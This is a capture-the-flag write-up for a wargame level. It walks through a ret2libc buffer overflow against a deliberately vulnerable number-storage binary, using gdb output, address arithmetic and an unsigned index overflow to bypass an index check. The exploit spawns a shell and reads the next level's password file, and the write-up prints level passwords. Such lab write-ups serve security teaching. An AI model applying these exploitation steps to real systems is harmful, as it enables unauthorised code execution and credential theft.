# Level 07
*password : GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8*

## Analyze

```
scp -P 4242 level07@192.168.56.109:level07 binary/
```

## Buffer overflow

**objective** : use the program to fill the buffer and execute `/bin/sh`

```
(gdb) find  0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) info funct system
...
0xf7e6aed0  system
...
(gdb) info funct exit
...
0xf7e5eb70  exit
...
```
- convert addresses to unsigned int
   - `system` : 0xf7e6aed0 = 4159090384\
   - `exit` : 0xf7e5eb70 = 4159040368\
   - `/bin/sh` : 0xf7f897ec = 4160264172
---
### Comupute offset

```
(gdb) b *0x0804892b
Breakpoint 1 at 0x804892b
(gdb) run
...
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
(gdb) x/x $eax
0xffffd544:     0x00000000
```
- `eip` address : 0xffffd70c
- `buffer` address : 0xffffd544

`0xffffd70c - 0xffffd544 = 1c8` (456 in decimal)

---

- eip offset found : 456

```
buffer[index * 4] = number;
```
- `system` at index 114 (456 / 4)
- `exit` at index 115
- `/bin/sh` at index 116\

index must not be a multiple of 3, but 114 % 3 = 0.\
max unsigned int : 4294967296\
4294967296 / 4 + 114 = 1073741938\
=> (unsigned int)1073741938 = 114\
1073741938 % 3 = 1\
so `system` at index 1073741938

```
$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115       
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
